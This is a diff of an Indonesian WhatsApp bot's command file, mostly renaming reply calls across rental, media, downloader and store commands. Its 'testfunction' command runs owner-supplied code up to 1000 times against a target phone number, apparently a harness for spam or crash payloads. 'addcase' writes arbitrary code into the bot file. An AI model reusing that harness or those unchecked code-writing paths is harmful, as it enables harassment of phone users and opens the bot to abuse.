         out += `${i + 1}. @${item.jid.split('@')[0]}\n   📅 ${new Date(item.time).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB\n`
     }
-    return Reply(out)
+    return replyV1(out)
 }
 break
 
@@ -12883,7 +12856,7 @@ case 'deobfuscate': {
     }
     code = String(code).trim()
     if (!code) {
-        return Reply(
+        return replyV1(
             `❌ Kode tidak ditemukan!\n\n` +
             `Cara penggunaan:\n` +
             `${prefix}deobf <kode>\n\n` +
@@ -12894,7 +12867,7 @@ case 'deobfuscate': {
     const sizeBytes = Buffer.byteLength(code, 'utf8')
     const sizeKB = (sizeBytes / 1024).toFixed(2)
     if (sizeBytes > MAX_DEOBF_SIZE) {
-        return Reply(
+        return replyV1(
             `❌ Kode terlalu besar!\n\n` +
             `📦 Ukuran : ${sizeKB} KB\n` +
             `📏 Maksimal : 1 MB\n\n` +
@@ -12902,13 +12875,13 @@ case 'deobfuscate': {
         )
     }
     try {
-        await Reply(
+        await replyV1(
             `⏳ Memproses kode...\n\n` +
             `📦 Ukuran : ${sizeKB} KB`
         )
         const result = simpleDeobfuscate(code)
         if (!result) {
-            return Reply(
+            return replyV1(
                 `❌ Gagal memproses kode.`
             )
         }
@@ -12931,7 +12904,7 @@ case 'deobfuscate': {
         )
     } catch (err) {
         console.error('[DEOBF ERROR]', err)
-        return Reply(
+        return replyV1(
             `❌ Deobfuscation gagal!\n\n` +
             `Error: ${err.message}`
         )
@@ -12939,10 +12912,10 @@ case 'deobfuscate': {
     break
 }
 case 'afk': {
-        if (!m.isGroup) return Reply(mess.group)
+        if (!m.isGroup) return replyV1(mess.group)
         let reason = text ? text : ''
         if (afk.checkAfkUser(m.sender, _afk)) {
-            return Reply('Kan udah tadi😠.')
+            return replyV1('Kan udah tadi😠.')
         }
         let obj = {
             id: m.sender,
@@ -12964,9 +12937,9 @@ case 'afk': {
 break
 //func
 case "testfunction": {
-    if (!isCreator) return Reply(mess.owner);
+    if (!isCreator) return replyV1(mess.owner);
     if (!text.includes("|"))
-        return Reply(
+        return replyV1(
 `Gunakan format yang benar contoh:
 .testfunction Nomor|Loop|async function maklu(target)\nawait maklu(target)
 
@@ -12978,8 +12951,8 @@ case "testfunction": {
     const nomor = nomorRaw.replace(/[^0-9]/g, "");  
     const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 1000));  
 
-    if (!nomor) return Reply("❌ Nomor tidak valid!");  
-    if (!funcFull) return Reply("❌ Masukkan function async yang benar!");  
+    if (!nomor) return replyV1("❌ Nomor tidak valid!");  
+    if (!funcFull) return replyV1("❌ Masukkan function async yang benar!");  
 
     const target = nomor + "@s.whatsapp.net";  
     const sandbox = {  
@@ -13002,7 +12975,7 @@ case "testfunction": {
         await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
     } catch (err) {
         adaError = true;
-        await Reply(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
+        await replyV1(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
         console.log("Error exec:", err);
         break;
     }
@@ -13011,7 +12984,7 @@ case "testfunction": {
 }
 
 if (!adaError) {
-    Reply(
+    replyV1(
 `✅ Success Testing Function!
 
 - Target : ${nomor}
@@ -13024,34 +12997,34 @@ if (!adaError) {
 }
 break;
 case "addsewa": {
-    if (!isOwner) return Reply("Hanya owner yang bisa menggunakan command ini!")
-    if (!text) return Reply("Contoh:\n.addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d")
+    if (!isOwner) return replyV1("Hanya owner yang bisa menggunakan command ini!")
+    if (!text) return replyV1("Contoh:\n.addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d")
     try {
         const [link, waktu] = text.split("|").map(item => item.trim())
-        if (!link || !waktu) return Reply("Format salah!\n\nContoh:\n.addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d")
+        if (!link || !waktu) return replyV1("Format salah!\n\nContoh:\n.addsewa https://chat.whatsapp.com/xxxxxxxxxxx | 30d")
         const waktuRegex = /^(\d+)(s|m|h|d)$/
-        if (!waktuRegex.test(waktu)) return Reply("Format waktu salah!\n\nGunakan:\n30s = detik\n30m = menit\n30h = jam\n30d = hari")
+        if (!waktuRegex.test(waktu)) return replyV1("Format waktu salah!\n\nGunakan:\n30s = detik\n30m = menit\n30h = jam\n30d = hari")
         const [, jumlah, unit] = waktu.match(waktuRegex)
         const totalDetik = calculateSeconds(parseInt(jumlah), unit)
         const inviteCode = await extractGroupId(link)
-        if (!inviteCode) return Reply("❌ Link group tidak valid!")
+        if (!inviteCode) return replyV1("❌ Link group tidak valid!")
         const groupId = await conn.groupAcceptInvite(inviteCode)
-        if (!groupId) return Reply("❌ Gagal mendapatkan ID grup!")
+        if (!groupId) return replyV1("❌ Gagal mendapatkan ID grup!")
         const rental = saveSewaData(groupId, totalDetik)
         const expired = new Date(rental.endTime)
-        return Reply(`✅ *BERHASIL MENAMBAHKAN SEWA*\n\n🆔 Group: ${groupId}\n📅 Durasi: ${jumlah}${unit}\n⏰ Berakhir: ${expired.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`)
+        return replyV1(`✅ *BERHASIL MENAMBAHKAN SEWA*\n\n🆔 Group: ${groupId}\n📅 Durasi: ${jumlah}${unit}\n⏰ Berakhir: ${expired.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`)
     } catch (error) {
         console.error("[ADD SEWA ERROR]", error)
-        return Reply("❌ Terjadi error saat menambah sewa:\n" + error.message)
+        return replyV1("❌ Terjadi error saat menambah sewa:\n" + error.message)
     }
 }
 break
 case "delsewa": {
     if (!isOwner) {
-        return Reply("Hanya owner yang bisa menggunakan command ini!")
+        return replyV1("Hanya owner yang bisa menggunakan command ini!")
     }
     if (!text) {
-        return Reply(
+        return replyV1(
             "Contoh:\n" +
             ".delsewa https://chat.whatsapp.com/xxxxxxxxxxx"
         )
@@ -13059,14 +13032,14 @@ case "delsewa": {
     try {
         const groupId = await extractGroupId(text.trim())
         if (!groupId) {
-            return Reply("❌ Link group tidak valid!")
+            return replyV1("❌ Link group tidak valid!")
         }
         const removed = sewaService.remove(groupId)
-        if (!removed) return Reply("❌ Group tersebut tidak memiliki data sewa.")
-        return Reply(`✅ *SEWA BERHASIL DIHAPUS*\n\n🆔 Group: ${groupId}`)
+        if (!removed) return replyV1("❌ Group tersebut tidak memiliki data sewa.")
+        return replyV1(`✅ *SEWA BERHASIL DIHAPUS*\n\n🆔 Group: ${groupId}`)
     } catch (error) {
         console.error('[DEL SEWA]', error)
-        return Reply(
+        return replyV1(
             "❌ Gagal menghapus sewa:\n" +
             error.message
         )
@@ -13074,10 +13047,10 @@ case "delsewa": {
 }
 break
 case "listsewa": {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     try {
         const activeSewa = sewaService.list(true)
-        if (!activeSewa.length) return Reply("📭 𝚃𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚜𝚎𝚠𝚊 𝚊𝚔𝚝𝚒𝚏 𝚞𝚗𝚝𝚞𝚔 𝚜𝚊𝚊𝚝 𝚒𝚗𝚒")
+        if (!activeSewa.length) return replyV1("📭 𝚃𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚜𝚎𝚠𝚊 𝚊𝚔𝚝𝚒𝚏 𝚞𝚗𝚝𝚞𝚔 𝚜𝚊𝚊𝚝 𝚒𝚗𝚒")
         const now = Date.now()
         let message = `📋 DAFTAR SEWA AKTIF\n\n`
         activeSewa.forEach((sewa, index) => {
@@ -13088,15 +13061,15 @@ case "listsewa": {
             message += `   ⏰ Sisa: ${hari} hari ${jam} jam\n`
             message += `   📅 Berakhir: ${new Date(Number(sewa.endTime)).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB\n\n`
         })
-        return Reply(message)
+        return replyV1(message)
     } catch (error) {
         console.error('[LIST SEWA]', error)
-        return Reply("❌ Gagal membaca data sewa: " + error.message)
+        return replyV1("❌ Gagal membaca data sewa: " + error.message)
     }
 }
 break;
 case "reactspam": {
-if (!m.quoted) return Reply("Reply pesan dulu")
+if (!m.quoted) return replyV1("Reply pesan dulu")
 
 let emoji = ["🔥","😂","🗿","😈","😎","💀","🤖","⚡","👑","🚀","🥶","🤡"," 👾","❤️‍🔥","🔰","🤍"]
 
@@ -13116,37 +13089,37 @@ let target = m.mentionedJid[0] || m.sender
 
 let device = m.key.id.length > 21 ? "Android 🤖" : "WhatsApp Web / iPhone 🍎"
 
-Reply(`📱 Device Info
+replyV1(`📱 Device Info
 User: @${target.split("@")[0]}
 Device: ${device}`, { mentions: [target] })
 }
 break
 case "autorespesan": {
-if (!isOwner) return Reply("Owner only")
+if (!isOwner) return replyV1("Owner only")
 
 if (args[0] === "on") {
 autoRes = true
-Reply("Auto respon diaktifkan")
+replyV1("Auto respon diaktifkan")
 } else if (args[0] === "off") {
 autoRes = false
-Reply("Auto respon dimatikan")
+replyV1("Auto respon dimatikan")
 } else {
-Reply("Contoh:\n.autores on\n.autores off")
+replyV1("Contoh:\n.autores on\n.autores off")
 }
 }
 break
 case "xnalzairespon": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 if (args[0] === "on") {
 xnalzAuto = true
-Reply("✅ Auto respon XnalzNotDev diaktifkan")
+replyV1("✅ Auto respon XnalzNotDev diaktifkan")
 } 
 else if (args[0] === "off") {
 xnalzAuto = false
-Reply("❌ Auto respon XnalzNotDev dimatikan")
+replyV1("❌ Auto respon XnalzNotDev dimatikan")
 } 
 else {
-Reply("contoh:\n.xnalzairespon on\n.xnalzairespon off")
+replyV1("contoh:\n.xnalzairespon on\n.xnalzairespon off")
 }
 
 }
@@ -13165,7 +13138,7 @@ conn.sendMessage(m.chat, { text: teks }, { quoted: seto })
 }
 break
 case "toimg": {
-if (!m.quoted) return Reply("Reply sticker")
+if (!m.quoted) return replyV1("Reply sticker")
 
 let media = await m.quoted.download()
 await conn.sendMessage(m.chat, {
@@ -13174,7 +13147,7 @@ image: media
 }
 break
 case "addcase2": {
-if (!m.quoted) return Reply("Reply case yang ingin ditambahkan")
+if (!m.quoted) return replyV1("Reply case yang ingin ditambahkan")
 
 let fs = require("fs")
 let path = "./xeryuu.js" // ganti sesuai file case kamu
@@ -13182,19 +13155,19 @@ let path = "./xeryuu.js" // ganti sesuai file case kamu
 let caseBaru = m.quoted.text
 
 fs.readFile(path, "utf8", (err, data) => {
-if (err) return Reply("File tidak ditemukan")
+if (err) return replyV1("File tidak ditemukan")
 
 let posisi = data.lastIndexOf("break")
 let hasil = data.slice(0, posisi) + caseBaru + "\n" + data.slice(posisi)
 
 fs.writeFileSync(path, hasil)
 
-Reply("✅ Case berhasil ditambahkan")
+replyV1("✅ Case berhasil ditambahkan")
 })
 }
 break
 case "addcase": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 
 const fs = require("fs")
 
@@ -13204,7 +13177,7 @@ console.log("Query:", q)
 
 if (!q) {
 console.log("❌ Tidak ada case dikirim")
-return Reply("Contoh:\n.addcase case \"halo\": {\nReply(\"Halo\")\n}\nbreak")
+return replyV1("Contoh:\n.addcase case \"halo\": {\nReply(\"Halo\")\n}\nbreak")
 }
 
 let filePath = "./xeryuu.js"
@@ -13215,14 +13188,14 @@ console.log("File berhasil dibaca")
 
 if (file.includes(q)) {
 console.log("⚠️ Case sudah ada")
-return Reply("Case sudah ada")
+return replyV1("Case sudah ada")
 }
 
 let posisi = file.lastIndexOf("break")
 
 if (posisi === -1) {
 console.log("❌ break terakhir tidak ditemukan")
-return Reply("Error: tidak menemukan posisi break")
+return replyV1("Error: tidak menemukan posisi break")
 }
 
 let newCase = "\n" + q + "\n"
@@ -13234,20 +13207,20 @@ fs.writeFileSync(filePath, newFile)
 console.log("✅ Case berhasil ditambahkan")
 console.log("===== ADDCASE END =====")
 
-Reply("✅ Case berhasil ditambahkan")
+replyV1("✅ Case berhasil ditambahkan")
 }
 break
 
 
 case "delcase": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 
 const fs = require("fs")
 
 console.log("===== DELCASE START =====")
 console.log("Case yang dihapus:", q)
 
-if (!q) return Reply("Contoh:\n.delcase halo")
+if (!q) return replyV1("Contoh:\n.delcase halo")
 
 let filePath = "./xeryuu.js"
 let file = fs.readFileSync(filePath, "utf8")
@@ -13256,7 +13229,7 @@ let regex = new RegExp(`case\\s+"${q}"[\\s\\S]*?break`, "g")
 
 if (!regex.test(file)) {
 console.log("❌ Case tidak ditemukan")
-return Reply("Case tidak ditemukan")
+return replyV1("Case tidak ditemukan")
 }
 
 let newFile = file.replace(regex, "")
@@ -13266,7 +13239,7 @@ fs.writeFileSync(filePath, newFile)
 console.log(chalk.red("✅ Case berhasil dihapus")) 
 console.log(chalk.red("===== DELCASE END =====")) 
 
-Reply("✅ Case berhasil dihapus")
+replyV1("✅ Case berhasil dihapus")
 }
 break
 case "allmenugif":
@@ -15326,7 +15299,7 @@ await sendLocalMenuAudio(qtoko);
 break
 case "toviewonce":
 case "to1xlihat": {
-    if (!m.quoted) return Reply('Reply foto / video nya!')
+    if (!m.quoted) return replyV1('Reply foto / video nya!')
 
     let msg = m.quoted
     let mime = (msg.msg || msg).mimetype || ''
@@ -15350,12 +15323,12 @@ case "to1xlihat": {
         }, { quoted: m })
 
     } else {
-        return Reply('Hanya bisa untuk foto / video!')
+        return replyV1('Hanya bisa untuk foto / video!')
     }
 }
 break;
 case "enchtml": {
-if (!m.quoted) return Reply("Reply file HTML")
+if (!m.quoted) return replyV1("Reply file HTML")
 
 let media = await m.quoted.download()
 let html = media.toString()
@@ -15376,8 +15349,8 @@ fileName: "enc.html"
 break
 case "antilinkall": {
 
-if (!m.isGroup) return Reply("Khusus grup")
-if (!isAdmins && !isCreator) return Reply("Khusus admin")
+if (!m.isGroup) return replyV1("Khusus grup")
+if (!isAdmins && !isCreator) return replyV1("Khusus admin")
 
 if (!antilink[m.chat]) antilink[m.chat] = { antilinkall: false, warnings: {} }
 
@@ -15388,7 +15361,7 @@ if (argsLower === "on") {
 antilink[m.chat].antilinkall = true
 saveAntilink()
 
-Reply("✅ AntiLink Semua AKTIF!")
+replyV1("✅ AntiLink Semua AKTIF!")
 
 }
 
@@ -15397,13 +15370,13 @@ else if (argsLower === "off") {
 antilink[m.chat].antilinkall = false
 saveAntilink()
 
-Reply("❌ AntiLink Semua NONAKTIF!")
+replyV1("❌ AntiLink Semua NONAKTIF!")
 
 }
 
 else {
 
-Reply(`Contoh:\n${prefix}antilinkall on\n${prefix}antilinkall off`)
+replyV1(`Contoh:\n${prefix}antilinkall on\n${prefix}antilinkall off`)
 
 }
 
@@ -15556,7 +15529,7 @@ Bot WhatsApp ini dibuat oleh *XnalzNotDev* untuk membantu tools, manajemen grup,
     await safeSend(conn, m.chat, {
       audio: audioBuffer,
       mimetype: 'audio/mpeg',
-      ptt: true,
+      ptt: false,
       fileName: `vn-${Date.now()}-${Math.floor(Math.random() * 9999)}.mp3`,
       contextInfo: {
         forwardingScore: 999999,
@@ -15589,7 +15562,7 @@ case 'menucategories3': {
 }
 break
 case 'aimenu': {
-    return Reply(
+    return replyV1(
         `╭━━━〔 🤖 MENU AI & CHAT 〕━━━╮\n` +
         `│ ${prefix}autorespesan <on/off>\n` +
         `│ ${prefix}xnalzAirespon <on/off>\n` +
@@ -15604,7 +15577,7 @@ case 'aimenu': {
 }
 break
 case 'animemenu': {
-    return Reply(
+    return replyV1(
         `╭━━━〔 🎌 MENU ANIME 〕━━━╮\n` +
         `│ ${prefix}animegirl\n` +
         `│ ${prefix}animefind <reply foto>\n` +
@@ -15616,7 +15589,7 @@ case 'animemenu': {
 }
 break
 case 'antilinkmenu': {
-    return Reply(
+    return replyV1(
         `╭━━━〔 🛡️ MENU ANTILINK & SECURITY 〕━━━╮\n` +
         `│ ${prefix}antilinkall <on/off>\n` +
         `│ ${prefix}antilinkch <on/off>\n` +
@@ -15637,12 +15610,12 @@ break
 
 case "videotourl": {
 try {
-if (!m.quoted) return Reply("❌ Reply video nya bang")
+if (!m.quoted) return replyV1("❌ Reply video nya bang")
 
 let mime = (m.quoted.msg || m.quoted).mimetype || ""
-if (!/video/.test(mime)) return Reply("❌ Harus video (mp4)")
+if (!/video/.test(mime)) return replyV1("❌ Harus video (mp4)")
 
-Reply("⏳ Uploading video...")
+replyV1("⏳ Uploading video...")
 
 let media = await conn.downloadAndSaveMediaMessage(m.quoted)
 
@@ -15661,11 +15634,11 @@ headers: form.getHeaders()
 
 fs.unlinkSync(media)
 
-Reply(`✅ *Upload Berhasil!*\n\n🔗 ${res.data}`)
+replyV1(`✅ *Upload Berhasil!*\n\n🔗 ${res.data}`)
 
 } catch (e) {
 console.log(e)
-Reply("❌ Error upload bang")
+replyV1("❌ Error upload bang")
 }
 }
 break
@@ -15676,10 +15649,10 @@ case "mp4toaudio": {
         let mime = (q.msg || q).mimetype || ""
 
         if (!/video/.test(mime)) {
-            return Reply("Kirim / reply video dulu!")
+            return replyV1("Kirim / reply video dulu!")
         }
 
-        Reply("⏳ Mengubah video ke audio...")
+        replyV1("⏳ Mengubah video ke audio...")
 
         // download video
         let media = await q.download()
@@ -15696,7 +15669,7 @@ case "mp4toaudio": {
         exec(`ffmpeg -i ${input} -vn -ab 128k -ar 44100 -y ${output}`, async (err) => {
             if (err) {
                 console.log(err)
-                return Reply("❌ Gagal convert!")
+                return replyV1("❌ Gagal convert!")
             }
 
             await conn.sendMessage(m.chat, {
@@ -15712,7 +15685,7 @@ case "mp4toaudio": {
 
     } catch (e) {
         console.log(e)
-        Reply("❌ Terjadi error!")
+        replyV1("❌ Terjadi error!")
     }
 }
 break;
@@ -15726,7 +15699,7 @@ case 'audiotourl': {
 
     // cek apakah file audio atau dokumen
     if (!/audio|ogg|mp3|m4a|opus/.test(mimetype)) {
-        return Reply(`❌ Kirim atau reply audio/voice note untuk diubah jadi URL dengan *${usedPrefix + command}*`);
+        return replyV1(`❌ Kirim atau reply audio/voice note untuk diubah jadi URL dengan *${usedPrefix + command}*`);
     }
 
     try {
@@ -15758,24 +15731,24 @@ case 'audiotourl': {
         await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
     } catch (e) {
         console.error(e);
-        Reply(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
+        replyV1(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
     }
 };
 break;
 case 'translate': case 'tr': {
 
-if (!text) return Reply("Contoh:\n.translate id hello world")
+if (!text) return replyV1("Contoh:\n.translate id hello world")
 
 let [lang, ...teks] = text.split(" ")
 let query = teks.join(" ")
 
-if (!query) return Reply("Masukkan teks yang ingin diterjemahkan")
+if (!query) return replyV1("Masukkan teks yang ingin diterjemahkan")
 
 const axios = require("axios")
 
 let res = await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(query)}&langpair=auto|${lang}`)
 
-Reply(`Translate (${lang}) :\n${res.data.responseData.translatedText}`)
+replyV1(`Translate (${lang}) :\n${res.data.responseData.translatedText}`)
 
 }
 break
@@ -15842,7 +15815,7 @@ case 'zingmp3':
 case 'bandcamp':
 case 'download':
 case "aio": {
-     if (!text) return Reply(`\`masukan link/url nya\``)
+     if (!text) return replyV1(`\`masukan link/url nya\``)
 
      // Perilaku command .spotify dari Furina: query mencari track; link track
      // langsung masuk ke downloader Spotify. Alias downloader universal lain
@@ -15864,17 +15837,17 @@ case "aio": {
          } catch (spotifyError) {
            console.error('[SPOTIFY LINK DOWNLOAD]', spotifyError?.stack || spotifyError)
            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-           return Reply(`❌ Gagal mengunduh track Spotify. ${spotifyError?.message || 'Coba gunakan .spdl atau coba lagi nanti.'}`)
+           return replyV1(`❌ Gagal mengunduh track Spotify. ${spotifyError?.message || 'Coba gunakan .spdl atau coba lagi nanti.'}`)
          }
          return
        }
        if (/^https?:\/\//i.test(spotifyInput)) {
-         return Reply('❌ Link Spotify yang didukung untuk download langsung saat ini adalah link track. Buka satu lagu lalu gunakan .spdl <link track>.');
+         return replyV1('❌ Link Spotify yang didukung untuk download langsung saat ini adalah link track. Buka satu lagu lalu gunakan .spdl <link track>.');
        }
        if (!/^https?:\/\//i.test(spotifyInput)) {
          try {
            const tracks = await searchSpotifyTracks(spotifyInput, 8)
-           if (!Array.isArray(tracks) || !tracks.length) return Reply('❌ Tidak ada track Spotify yang cocok dengan kata kunci tersebut.');
+           if (!Array.isArray(tracks) || !tracks.length) return replyV1('❌ Tidak ada track Spotify yang cocok dengan kata kunci tersebut.');
            const rows = tracks.map(track => ({
              title: `🎵 ${String(track.title || 'Track').replace(/[\r\n]/g, ' ').slice(0, 55)}`,
              description: `${String(track.artist || 'Unknown Artist').slice(0, 40)} • ${track.duration || '-'}`.slice(0, 72),
@@ -15896,7 +15869,7 @@ case "aio": {
            await conn.relayMessage(m.chat, waMessage.message, { messageId: waMessage.key.id })
          } catch (spotifySearchError) {
            console.error('[SPOTIFY QUERY]', spotifySearchError?.stack || spotifySearchError)
-           return Reply(`❌ Pencarian Spotify gagal. ${spotifySearchError?.message || 'Coba .spsearch atau ulangi nanti.'}`)
+           return replyV1(`❌ Pencarian Spotify gagal. ${spotifySearchError?.message || 'Coba .spsearch atau ulangi nanti.'}`)
          }
          return
        }
@@ -15912,10 +15885,10 @@ case "aio": {
      try { scraprPlatform = resolveScraprPlatform(scaprCommandName, scraprInputUrl); } catch {}
    }
    if (['scrapr', 'scrapeurl', 'resolver'].includes(scraprCommandName) && scraprPlatform === 'spotify') {
-     return Reply('ℹ️ Spotify tetap memakai downloader Xeryuu yang sudah ada. Gunakan .spotify atau .spdl.');
+     return replyV1('ℹ️ Spotify tetap memakai downloader Xeryuu yang sudah ada. Gunakan .spotify atau .spdl.');
    }
    if (['scrapr', 'scrapeurl', 'resolver'].includes(scraprCommandName) && scraprPlatform === 'mediafire') {
-     return Reply('ℹ️ MediaFire tetap memakai downloader Xeryuu yang sudah ada. Gunakan .mediafire.');
+     return replyV1('ℹ️ MediaFire tetap memakai downloader Xeryuu yang sudah ada. Gunakan .mediafire.');
    }
    if (scraprPlatform && !['spotify', 'mediafire'].includes(scraprPlatform)) {
      try {
@@ -16022,13 +15995,13 @@ case "aio": {
     await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
   } catch (err) {
     await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }) 
-    Reply(err.message)
+    replyV1(err.message)
   }
 break;
 }
 case "pinterest": {
     if (!text) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan link Pinterest.\n\n` +
             `Contoh:\n` +
             `${prefix}pinterest https://pin.it/xxxxx`
@@ -16044,12 +16017,12 @@ case "pinterest": {
             pinterestHost === 'pinterest.com' || pinterestHost.endsWith('.pinterest.com') ||
             /^pinterest\.[a-z]{2,3}$/i.test(pinterestHost) || /^pinterest\.co\.[a-z]{2}$/i.test(pinterestHost);
         if (!['http:', 'https:'].includes(parsedPinterestUrl.protocol) || !validPinterestHost) {
-            return Reply('❌ Link tersebut bukan link Pinterest yang valid.')
+            return replyV1('❌ Link tersebut bukan link Pinterest yang valid.')
         }
         parsedPinterestUrl.hash = '';
         const url = parsedPinterestUrl.toString();
 
-        await Reply('⏳ Mengambil media Pinterest...')
+        await replyV1('⏳ Mengambil media Pinterest...')
 
         try {
             const scraprResult = await extractScrapr(url, 'pinterest');
@@ -16144,7 +16117,7 @@ case "pinterest": {
         )
 
         if (!mediaUrl || typeof mediaUrl !== 'string') {
-            return Reply(
+            return replyV1(
                 `❌ Gagal mendapatkan URL media Pinterest.\n\n` +
                 `Response API tidak memiliki URL media yang valid.`
             )
@@ -16190,7 +16163,7 @@ case "pinterest": {
             '[PINTEREST ERROR]',
             err
         )
-        return Reply(
+        return replyV1(
             `❌ Gagal mengunduh Pinterest.\n\n` +
             `Error: ${err?.message || err}`
         )
@@ -16198,7 +16171,7 @@ case "pinterest": {
 }
 break
 case "applesearch": {
-if (!text) return Reply("Contoh:\n.applesearch xxxtentacion moonlight")
+if (!text) return replyV1("Contoh:\n.applesearch xxxtentacion moonlight")
 
 try {
 
@@ -16208,7 +16181,7 @@ let res = await axios.get(`https://itunes.apple.com/search?term=${encodeURICompo
 
 let data = res.data.results
 
-if (!data || data.length === 0) return Reply("Lagu tidak ditemukan")
+if (!data || data.length === 0) return replyV1("Lagu tidak ditemukan")
 
 let caption = `🎵 *APPLE SEARCH*\n\n`
 
@@ -16250,11 +16223,11 @@ caption += `🔗 ${data[i].trackViewUrl}\n\n`
 
 }
 
-Reply(caption)
+replyV1(caption)
 
 } catch (err) {
 console.log("SPOTIFY SEARCH ERROR:", err.message)
-Reply("Search lagu gagal")
+replyV1("Search lagu gagal")
 }
 
 }
@@ -17572,7 +17545,7 @@ case 'jasher':
 case 'jashermenu': {
     await sendXeryuuMenuArtwork('JASHER MENU', 'media/store/sewabot.jpg')
     const products = storeService.products().filter(p => p.type === 'jasher')
-    if (!products.length) return Reply('❌ Paket Jasher belum tersedia di settings.js.')
+    if (!products.length) return replyV1('❌ Paket Jasher belum tersedia di settings.js.')
     let out = `╔─═⪩ 『 📣 JASA SHARE / JASHER 』\n`
     products.forEach((p, i) => {
         out += `║ ${i + 1}. *${p.name}*\n`
@@ -17583,22 +17556,22 @@ case 'jashermenu': {
     })
     out += `╚─═─═─═─═─═─═⪩\n\n`
     out += `Premium membutuhkan status premium. Paket Owner hanya owner. Paket CEO hanya CEO/owner.`
-    return Reply(out)
+    return replyV1(out)
 }
 break
 case 'jasherbuy': {
     const requestedPlan = String(args[0] || 'premium').toLowerCase()
     const map = { premium: 'jasherpremium', owner: 'jasherowner', ceo: 'jasherceo' }
     const key = map[requestedPlan] || (storeService.getProduct(args[0])?.type === 'jasher' ? String(args[0]).toLowerCase() : '')
-    if (!key) return Reply(`Gunakan: *${prefix}jasherbuy premium|owner|ceo*`)
+    if (!key) return replyV1(`Gunakan: *${prefix}jasherbuy premium|owner|ceo*`)
     const plan = key.replace(/^jasher/, '')
     const ceoCandidates = Array.isArray(global.ceoJids)
         ? global.ceoJids.map(jid => String(jid || '').includes('@') ? String(jid) : `${String(jid || '').replace(/\D/g, '')}@s.whatsapp.net`).filter(Boolean)
         : []
     const isCeo = isCreator || ceoCandidates.some(jid => normalizeOwnerJid(jid) === normalizeOwnerJid(m.sender))
-    if (plan === 'premium' && !isPremium && !isCreator) return Reply('❌ Paket Jasher Premium hanya dapat dibeli oleh user premium.')
-    if (plan === 'owner' && !isCreator) return Reply(mess.owner)
-    if (plan === 'ceo' && !isCeo) return Reply('❌ Paket CEO hanya untuk CEO/owner.')
+    if (plan === 'premium' && !isPremium && !isCreator) return replyV1('❌ Paket Jasher Premium hanya dapat dibeli oleh user premium.')
+    if (plan === 'owner' && !isCreator) return replyV1(mess.owner)
+    if (plan === 'ceo' && !isCeo) return replyV1('❌ Paket CEO hanya untuk CEO/owner.')
     try {
         const created = await storeService.createOrder({ jid: m.sender, productKey: key, pushname })
         let image = null
@@ -17615,22 +17588,22 @@ case 'jasherbuy': {
             `Batalkan order: ${prefix}ordercancel ${created.order.ref}`
         return sendStoreOrderInteractive(created.order, image, caption)
     } catch (e) {
-        return Reply(`❌ Gagal membuat order Jasher: ${e?.message || e}`)
+        return replyV1(`❌ Gagal membuat order Jasher: ${e?.message || e}`)
     }
 }
 break
 case 'jasherkirim': {
-    if (!args[0] || !args.slice(1).length) return Reply(`Contoh: ${prefix}jasherkirim ORDXXXX | https://wa.me/... | pesan share`)
+    if (!args[0] || !args.slice(1).length) return replyV1(`Contoh: ${prefix}jasherkirim ORDXXXX | https://wa.me/... | pesan share`)
     const raw = text
     const parts = raw.split('|').map(v => v.trim())
     const ref = String(parts.shift() || '').toUpperCase()
     const target = parts.shift() || ''
     const message = parts.join(' | ').trim()
     const order = storeService.getOrder(ref)
-    if (!order || order.productType !== 'jasher') return Reply('❌ Order Jasher tidak ditemukan.')
-    if (order.jid !== m.sender && !isCreator) return Reply('❌ Order ini bukan milik kamu.')
-    if (!['WAITING_CONTENT', 'WAITING_PROCESS', 'PROCESSING'].includes(String(order.status))) return Reply(`❌ Order belum siap menerima materi. Status: *${order.status}*`)
-    if (!target || !message) return Reply(`Format: ${prefix}jasherkirim ${ref} | target/link | pesan`)
+    if (!order || order.productType !== 'jasher') return replyV1('❌ Order Jasher tidak ditemukan.')
+    if (order.jid !== m.sender && !isCreator) return replyV1('❌ Order ini bukan milik kamu.')
+    if (!['WAITING_CONTENT', 'WAITING_PROCESS', 'PROCESSING'].includes(String(order.status))) return replyV1(`❌ Order belum siap menerima materi. Status: *${order.status}*`)
+    if (!target || !message) return replyV1(`Format: ${prefix}jasherkirim ${ref} | target/link | pesan`)
     const updated = storeService.updateOrder(ref, {
         status: 'WAITING_PROCESS',
         jasher: { ...(order.jasher || {}), target, message, submittedAt: Date.now() }
@@ -17645,11 +17618,11 @@ case 'jasherkirim': {
 break
 case 'jasherstatus': {
     const ref = String(args[0] || '').toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}jasherstatus ORDXXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}jasherstatus ORDXXXX`)
     const order = storeService.getOrder(ref)
-    if (!order || order.productType !== 'jasher') return Reply('❌ Order Jasher tidak ditemukan.')
-    if (order.jid !== m.sender && !isCreator) return Reply(mess.owner)
-    return Reply(
+    if (!order || order.productType !== 'jasher') return replyV1('❌ Order Jasher tidak ditemukan.')
+    if (order.jid !== m.sender && !isCreator) return replyV1(mess.owner)
+    return replyV1(
         `╭─〔 📣 STATUS JASHER 〕\n` +
